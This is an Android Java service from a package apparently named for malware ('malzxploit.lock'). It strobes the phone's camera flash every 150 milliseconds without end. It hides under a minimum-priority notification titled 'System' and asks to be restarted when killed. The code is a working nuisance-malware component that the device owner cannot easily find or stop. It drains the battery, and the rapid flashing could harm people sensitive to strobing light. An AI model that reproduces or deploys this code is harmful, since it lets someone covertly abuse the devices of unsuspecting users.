package com.malzxploit.lock;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

public class StrobeService extends Service {

    private static final String TAG = "Strobe";
    private CameraManager camManager;
    private String cameraId;
    private boolean isOn = false;
    private boolean running = true;
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler();
        try {
            camManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (camManager != null && camManager.getCameraIdList().length > 0) {
                cameraId = camManager.getCameraIdList()[0];
                Log.d(TAG, "Camera ID: " + cameraId);
            }
        } catch (Exception e) {
            Log.e(TAG, "cam init error: " + e.getMessage());
        }

        try {
            NotificationChannel ch = new NotificationChannel(
                "strobe", "Strobe", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
            Notification n = new Notification.Builder(this, "strobe")
                .setContentTitle("System")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setPriority(Notification.PRIORITY_MIN)
                .build();
            startForeground(2, n);
        } catch (Exception e) {
            Log.e(TAG, "notif error: " + e.getMessage());
        }

        startStrobe();
    }

    private void startStrobe() {
        Runnable blink = new Runnable() {
            @Override
            public void run() {
                if (!running) return;
                try {
                    if (camManager != null && cameraId != null) {
                        isOn = !isOn;
                        camManager.setTorchMode(cameraId, isOn);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "torch error: " + e.getMessage());
                }
                handler.postDelayed(this, 150);
            }
        };
        handler.post(blink);
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        running = true;
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        try {
            if (camManager != null && cameraId != null) {
                camManager.setTorchMode(cameraId, false);
            }
        } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
